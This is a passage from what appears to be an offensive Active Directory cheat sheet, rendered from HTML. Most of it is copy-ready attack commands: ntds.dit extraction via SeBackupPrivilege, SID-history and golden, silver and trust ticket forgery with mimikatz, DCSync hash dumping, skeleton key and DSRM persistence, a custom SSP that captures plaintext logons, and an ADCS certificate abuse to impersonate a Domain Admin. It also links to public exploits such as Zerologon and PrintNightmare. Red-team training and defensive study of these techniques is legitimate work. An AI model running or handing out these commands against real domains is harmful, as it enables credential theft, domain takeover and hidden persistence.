<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>   #Importing both dlls from the repo using powershell
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>   Import-Module .\SeBackupPrivilegeCmdLets.dll
</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>   Import-Module .\SeBackupPrivilegeUtils.dll
</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a>
</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>   #Checking if the SeBackupPrivilege is enabled
</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>   Get-SeBackupPrivilege
</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a>
</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a>   #If it isn&#39;t we enable it
</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a>   Set-SeBackupPrivilege
</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a>
</span><span id="__span-54-11"><a id="__codelineno-54-11" name="__codelineno-54-11" href="#__codelineno-54-11"></a>   #Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
</span><span id="__span-54-12"><a id="__codelineno-54-12" name="__codelineno-54-12" href="#__codelineno-54-12"></a>   Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\&lt;PathToSave&gt;\ntds.dit -Overwrite
</span><span id="__span-54-13"><a id="__codelineno-54-13" name="__codelineno-54-13" href="#__codelineno-54-13"></a>
</span><span id="__span-54-14"><a id="__codelineno-54-14" name="__codelineno-54-14" href="#__codelineno-54-14"></a>   #Dump the SYSTEM hive
</span><span id="__span-54-15"><a id="__codelineno-54-15" name="__codelineno-54-15" href="#__codelineno-54-15"></a>   reg save HKLM\SYSTEM c:\temp\system.hive
</span></code></pre></div>
<ol>
<li>Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.</li>
<li>Use secretsdump.py from impacket and dump the hashes.</li>
<li>
<p>Use psexec or another tool of your choice to PTH and get Domain Admin access.</p>
</li>
<li>
<p>Abusing Exchange</p>
</li>
<li>
<p><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">Abusing Exchange one Api call from DA</a></p>
</li>
<li><a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys">CVE-2020-0688</a></li>
<li>
<p><a href="https://github.com/dirkjanm/PrivExchange">PrivExchange</a> Exchange your privileges for Domain Admin privs by abusing Exchange</p>
</li>
<li>
<p>Weaponizing Printer Bug</p>
</li>
<li>
<p><a href="https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/">Printer Server Bug to Domain Administrator</a></p>
</li>
<li>
<p><a href="https://github.com/NotMedic/NetNTLMtoSilverTicket">NetNTLMtoSilverTicket</a></p>
</li>
<li>
<p>Abusing ACLs</p>
</li>
<li>
<p><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">Escalating privileges with ACLs in Active Directory</a></p>
</li>
<li><a href="https://github.com/fox-it/aclpwn.py">aclpwn.py</a></li>
<li>
<p><a href="https://github.com/fox-it/Invoke-ACLPwn">Invoke-ACLPwn</a></p>
</li>
<li>
<p>Abusing IPv6 with mitm6</p>
</li>
<li>
<p><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">Compromising IPv4 networks via IPv6</a></p>
</li>
<li><a href="https://github.com/fox-it/mitm6">mitm6</a></li>
</ol>
<h2 id="sid-history-abuse">SID History Abuse</h2>
<p><em>WUT IS DIS?: If we manage to compromise a child domain of a forest and <a href="https://www.itprotoday.com/windows-8/sid-filtering">SID filtering</a> isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the <a href="https://www.itprotoday.com/windows-8/sid-history">SID History</a> field on a kerberos TGT ticket, that defines the "extra" security groups and privileges.</em></p>
<p>Exploitation example:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>#Get the SID of the Current Domain using PowerView
</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>Get-DomainSID -Domain current.root.domain.local
</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>
</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a>#Get the SID of the Root Domain using PowerView
</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a>Get-DomainSID -Domain root.domain.local
</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a>
</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a>#Create the Enteprise Admins SID
</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a>Format: RootDomainSID-519
</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a>
</span><span id="__span-55-10"><a id="__codelineno-55-10" name="__codelineno-55-10" href="#__codelineno-55-10"></a>#Forge &quot;Extra&quot; Golden Ticket using mimikatz
</span><span id="__span-55-11"><a id="__codelineno-55-11" name="__codelineno-55-11" href="#__codelineno-55-11"></a>kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:&lt;CurrentDomainSID&gt; /krbtgt:&lt;krbtgtHash&gt; /sids:&lt;EnterpriseAdminsSID&gt; /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi
</span><span id="__span-55-12"><a id="__codelineno-55-12" name="__codelineno-55-12" href="#__codelineno-55-12"></a>
</span><span id="__span-55-13"><a id="__codelineno-55-13" name="__codelineno-55-13" href="#__codelineno-55-13"></a>#Inject the ticket into memory
</span><span id="__span-55-14"><a id="__codelineno-55-14" name="__codelineno-55-14" href="#__codelineno-55-14"></a>kerberos::ptt \path\to\ticket\golden.kirbi
</span><span id="__span-55-15"><a id="__codelineno-55-15" name="__codelineno-55-15" href="#__codelineno-55-15"></a>
</span><span id="__span-55-16"><a id="__codelineno-55-16" name="__codelineno-55-16" href="#__codelineno-55-16"></a>#List the DC of the Root Domain
</span><span id="__span-55-17"><a id="__codelineno-55-17" name="__codelineno-55-17" href="#__codelineno-55-17"></a>dir \\dc.root.domain.local\C$
</span><span id="__span-55-18"><a id="__codelineno-55-18" name="__codelineno-55-18" href="#__codelineno-55-18"></a>
</span><span id="__span-55-19"><a id="__codelineno-55-19" name="__codelineno-55-19" href="#__codelineno-55-19"></a>#Or DCsync and dump the hashes using mimikatz
</span><span id="__span-55-20"><a id="__codelineno-55-20" name="__codelineno-55-20" href="#__codelineno-55-20"></a>lsadump::dcsync /domain:root.domain.local /all
</span></code></pre></div>
<p>Detailed Articles:</p>
<ul>
<li><a href="https://adsecurity.org/?p=1640">Kerberos Golden Tickets are Now More Golden</a></li>
<li><a href="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/">A Guide to Attacking Domain Trusts</a></li>
</ul>
<h2 id="exploiting-sharepoint">Exploiting SharePoint</h2>
<ul>
<li><a href="https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d">CVE-2019-0604</a> RCE Exploitation \
  <a href="https://github.com/k8gege/CVE-2019-0604">PoC</a></li>
<li><a href="https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization">CVE-2019-1257</a> Code execution through BDC deserialization</li>
<li>
<p><a href="https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters">CVE-2020-0932</a> RCE using typeconverters \
  <a href="https://github.com/thezdi/PoC/tree/master/CVE-2020-0932">PoC</a></p>
</li>
<li>
<p>Zerologon</p>
</li>
<li>
<p><a href="https://www.secura.com/whitepapers/zerologon-whitepaper">Zerologon: Unauthenticated domain controller compromise</a>: White paper of the vulnerability.</p>
</li>
<li><a href="https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon">SharpZeroLogon</a>: C# implementation of the Zerologon exploit.</li>
<li><a href="https://github.com/BC-SECURITY/Invoke-ZeroLogon">Invoke-ZeroLogon</a>: PowerShell implementation of the Zerologon exploit.</li>
<li>
<p><a href="https://github.com/bb00/zer0dump">Zer0Dump</a>: Python implementation of the Zerologon exploit using the impacket library.</p>
</li>
<li>
<p>PrintNightmare</p>
</li>
<li>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527">CVE-2021-34527</a>: Vulnerability details.</p>
</li>
<li><a href="https://github.com/cube0x0/CVE-2021-1675">Impacket implementation of PrintNightmare</a>: Reliable PoC of PrintNightmare using the impacket library.</li>
<li>
<p><a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare">C# Implementation of CVE-2021-1675</a>: Reliable PoC of PrintNightmare written in C#.</p>
</li>
<li>
<p>Active Directory Certificate Services</p>
</li>
</ul>
<p><strong>Check for Vulnerable Certificate Templates with:</strong> <a href="https://github.com/GhostPack/Certify">Certify</a></p>
<p><em>Note: Certify can be executed with Cobalt Strike's <code>execute-assembly</code> command as well</em></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>.\Certify.exe find /vulnerable /quiet
</span></code></pre></div>
<p>Make sure the msPKI-Certificates-Name-Flag value is set to "ENROLLEE_SUPPLIES_SUBJECT" and that the Enrollment Rights
allow Domain/Authenticated Users. Additionally, check that the pkiextendedkeyusage parameter contains the "Client Authentication" value as well as that the "Authorized Signatures Required" parameter is set to 0.</p>
<p>This exploit only works because these settings enable server/client authentication, meaning an attacker can specify the UPN of a Domain Admin ("DA")
and use the captured certificate with Rubeus to forge authentication.</p>
<p><em>Note: If a Domain Admin is in a Protected Users group, the exploit may not work as intended. Check before choosing a DA to target.</em></p>
<p>Request the DA's Account Certificate with Certify</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>.\Certify.exe request /template:&lt;Template Name&gt; /quiet /ca:&quot;&lt;CA Name&gt;&quot; /domain:&lt;domain.com&gt; /path:CN=Configuration,DC=&lt;domain&gt;,DC=com /altname:&lt;Domain Admin AltName&gt; /machine
</span></code></pre></div>
<p>This should return a valid certificate for the associated DA account.</p>
<p>The exported <code>cert.pem</code> and <code>cert.key</code> files must be consolidated into a single <code>cert.pem</code> file, with one gap of whitespace between the <code>END RSA PRIVATE KEY</code> and the <code>BEGIN CERTIFICATE</code>.</p>
<p><em>Example of <code>cert.pem</code>:</em></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>-----BEGIN RSA PRIVATE KEY-----
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>BIIEogIBAAk15x0ID[...]
</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>[...]
</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>[...]
</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>-----END RSA PRIVATE KEY-----
</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>
</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a>-----BEGIN CERTIFICATE-----
</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a>BIIEogIBOmgAwIbSe[...]
</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a>[...]
</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a>[...]
</span><span id="__span-58-11"><a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a>-----END CERTIFICATE-----
</span></code></pre></div>
<ul>
<li>Utilize <code>openssl</code> to Convert to PKCS #12 Format</li>
</ul>
<p>The <code>openssl</code> command can be utilized to convert the certificate file into PKCS #12 format (you may be required to enter an export password, which can be anything you like).</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
</span></code></pre></div>
<p>Once the <code>cert.pfx</code> file has been exported, upload it to the compromised host (this can be done in a variety of ways, such as with Powershell, SMB, <code>certutil.exe</code>, Cobalt Strike's upload functionality, etc.)</p>
<p>After the <code>cert.pfx</code> file has been uploaded to the compromised host, <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> can be used to request a Kerberos TGT for the DA account which will then be imported into memory.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>.\Rubeus.exe asktht /user:&lt;Domain Admin AltName&gt; /domain:&lt;domain.com&gt; /dc:&lt;Domain Controller IP or Hostname&gt; /certificate:&lt;Local Machine Path to cert.pfx&gt; /nowrap /ptt
</span></code></pre></div>
<p>This should result in a successfully imported ticket, which then enables an attacker to perform various malicious acitivities under DA user context, such as performing a DCSync attack.</p>
<ul>
<li>
<p>No PAC</p>
</li>
<li>
<p><a href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">sAMAccountname Spoofing</a> Exploitation of CVE-2021-42278 and CVE-2021-42287</p>
</li>
<li><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">Weaponisation of CVE-2021-42287/CVE-2021-42278</a> Exploitation of CVE-2021-42278 and CVE-2021-42287</li>
<li><a href="https://github.com/cube0x0/noPac">noPAC</a> C# tool to exploit CVE-2021-42278 and CVE-2021-42287</li>
<li><a href="https://github.com/WazeHell/sam-the-admin">sam-the-admin</a> Python automated tool to exploit CVE-2021-42278 and CVE-2021-42287</li>
<li>
<p><a href="https://github.com/Ridter/noPac">noPac</a> Evolution of "sam-the-admin" tool</p>
</li>
<li>
<p>Domain Persistence</p>
</li>
<li>
<p>Golden Ticket Attack</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>#Execute mimikatz on DC as DA to grab krbtgt hash:
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>Invoke-Mimikatz -Command &#39;&quot;lsadump::lsa /patch&quot;&#39; -ComputerName &lt;DC&#39;sName&gt;
</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a>
</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>#On any machine:
</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a>Invoke-Mimikatz -Command &#39;&quot;kerberos::golden /user:Administrator /domain:&lt;DomainName&gt; /sid:&lt;Domain&#39;s SID&gt; /krbtgt:
</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a>&lt;HashOfkrbtgtAccount&gt;   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt&quot;&#39;
</span></code></pre></div>
<ul>
<li>DCsync Attack</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>#DCsync using mimikatz (You need DA rights or DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges):
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>Invoke-Mimikatz -Command &#39;&quot;lsadump::dcsync /user:&lt;DomainName&gt;\&lt;AnyDomainUser&gt;&quot;&#39;
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>#DCsync using secretsdump.py from impacket with NTLM authentication
</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>secretsdump.py &lt;Domain&gt;/&lt;Username&gt;:&lt;Password&gt;@&lt;DC&#39;S IP or FQDN&gt; -just-dc-ntlm
</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>
</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>#DCsync using secretsdump.py from impacket with Kerberos Authentication
</span><span id="__span-62-8"><a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a>secretsdump.py -no-pass -k &lt;Domain&gt;/&lt;Username&gt;@&lt;DC&#39;S IP or FQDN&gt; -just-dc-ntlm
</span></code></pre></div>
<p><strong>Tip:</strong> \
 /ptt -&gt; inject ticket on current running session \
 /ticket -&gt; save the ticket on the system for later use</p>
<ul>
<li>Silver Ticket Attack</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>Invoke-Mimikatz -Command &#39;&quot;kerberos::golden /domain:&lt;DomainName&gt; /sid:&lt;DomainSID&gt; /target:&lt;TheTargetMachine&gt; /service:
</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>&lt;ServiceType&gt; /rc4:&lt;TheSPN&#39;s Account NTLM Hash&gt; /user:&lt;UserToImpersonate&gt; /ptt&quot;&#39;
</span></code></pre></div>
<p><a href="https://adsecurity.org/?page_id=183">SPN List</a></p>
<ul>
<li>Skeleton Key Attack</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>#Exploitation Command runned as DA:
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;misc::skeleton&quot;&#39; -ComputerName &lt;DC&#39;s FQDN&gt;
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>#Access using the password &quot;mimikatz&quot;
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>Enter-PSSession -ComputerName &lt;AnyMachineYouLike&gt; -Credential &lt;Domain&gt;\Administrator
</span></code></pre></div>
<ul>
<li>DSRM Abuse</li>
</ul>
<p><em>WUT IS DIS?: Every DC has a local Administrator account, this accounts has the DSRM password which is a SafeBackupPassword. We can get this and then pth its NTLM hash to get local Administrator access to DC!</em></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>#Dump DSRM password (needs DA privs):
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>Invoke-Mimikatz -Command &#39;&quot;token::elevate&quot; &quot;lsadump::sam&quot;&#39; -ComputerName &lt;DC&#39;s Name&gt;
</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>
</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>#This is a local account, so we can PTH and authenticate!
</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a>#BUT we need to alter the behaviour of the DSRM account before pth:
</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a>#Connect on DC:
</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a>Enter-PSSession -ComputerName &lt;DC&#39;s Name&gt;
</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a>
</span><span id="__span-65-9"><a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a>#Alter the Logon behaviour on registry:
</span><span id="__span-65-10"><a id="__codelineno-65-10" name="__codelineno-65-10" href="#__codelineno-65-10"></a>New-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -Name &quot;DsrmAdminLogonBehaviour&quot; -Value 2 -PropertyType DWORD -Verbose
</span><span id="__span-65-11"><a id="__codelineno-65-11" name="__codelineno-65-11" href="#__codelineno-65-11"></a>
</span><span id="__span-65-12"><a id="__codelineno-65-12" name="__codelineno-65-12" href="#__codelineno-65-12"></a>#If the property already exists:
</span><span id="__span-65-13"><a id="__codelineno-65-13" name="__codelineno-65-13" href="#__codelineno-65-13"></a>Set-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -Name &quot;DsrmAdminLogonBehaviour&quot; -Value 2 -Verbose
</span></code></pre></div>
<p>Then just PTH to get local admin access on DC!</p>
<ul>
<li>Custom SSP</li>
</ul>
<p><em>WUT IS DIS?: We can set our on SSP by dropping a custom dll, for example mimilib.dll from mimikatz, that will monitor and capture plaintext passwords from users that logged on!</em></p>
<p>From powershell:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>#Get current Security Package:
</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>$packages = Get-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&quot; -Name &#39;Security Packages&#39; | select -ExpandProperty  &#39;Security Packages&#39;
</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a>
</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>#Append mimilib:
</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a>$packages += &quot;mimilib&quot;
</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a>
</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a>#Change the new packages name
</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a>Set-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\&quot; -Name &#39;Security Packages&#39; -Value $packages
</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>Set-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -Name &#39;Security Packages&#39; -Value $packages
</span><span id="__span-66-10"><a id="__codelineno-66-10" name="__codelineno-66-10" href="#__codelineno-66-10"></a>
</span><span id="__span-66-11"><a id="__codelineno-66-11" name="__codelineno-66-11" href="#__codelineno-66-11"></a>#ALTERNATIVE:
</span><span id="__span-66-12"><a id="__codelineno-66-12" name="__codelineno-66-12" href="#__codelineno-66-12"></a>Invoke-Mimikatz -Command &#39;&quot;misc::memssp&quot;&#39;
</span></code></pre></div>
<p>Now all logons on the DC are logged to -&gt; C:\Windows\System32\kiwissp.log</p>
<h2 id="cross-forest-attacks">Cross Forest Attacks</h2>
<ul>
<li>Trust Tickets</li>
</ul>
<p><em>WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT.</em></p>
<p>:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!</p>
<ul>
<li>Using Mimikatz:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>  #Dump the trust key
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>  Invoke-Mimikatz -Command &#39;&quot;lsadump::trust /patch&quot;&#39;
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>  Invoke-Mimikatz -Command &#39;&quot;lsadump::lsa /patch&quot;&#39;
</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a>
</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a>  #Forge an inter-realm TGT using the Golden Ticket attack
</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a>  Invoke-Mimikatz -Command &#39;&quot;kerberos::golden /user:Administrator /domain:&lt;OurDomain&gt; /sid:
</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a>  &lt;OurDomainSID&gt; /rc4:&lt;TrustKey&gt; /service:krbtgt /target:&lt;TheTargetDomain&gt; /ticket:
</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a>  &lt;PathToSaveTheGoldenTicket&gt;&quot;&#39;
</span></code></pre></div>
<p>:exclamation: Tickets -&gt; .kirbi format</p>
<p>Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!</p>
<ul>
<li>Using Rubeus:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>  .\Rubeus.exe asktgs /ticket:&lt;kirbi file&gt; /service:&quot;Service&#39;s SPN&quot; /ptt
</span></code></pre></div>
<ul>
<li>
<p>Abuse MSSQL Servers</p>
</li>
<li>
<p>Enumerate MSSQL Instances: <code>Get-SQLInstanceDomain</code></p>
</li>
<li>Check Accessibility as current user:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>  Get-SQLConnectionTestThreaded
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
</span></code></pre></div>
<ul>
<li>Gather Information about the instance: <code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose</code></li>
<li>Abusing SQL Database Links: \
  <em>WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!</em></li>
</ul>
<p>Check for existing Database Links:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>#Check for existing Database Links:
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>#PowerUpSQL:
</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>Get-SQLServerLink -Instance &lt;SPN&gt; -Verbose
</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>
</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>#MSSQL Query:
</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>select * from master..sysservers
</span></code></pre></div>
<p>Then we can use queries to enumerate other links from the linked Database:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>#Manualy:
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>select * from openquery(&quot;LinkedDatabase&quot;, &#39;select * from master..sysservers&#39;)
</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>
</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a>#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>Get-SQLServerLinkCrawl -Instance &lt;SPN&gt; -Verbose
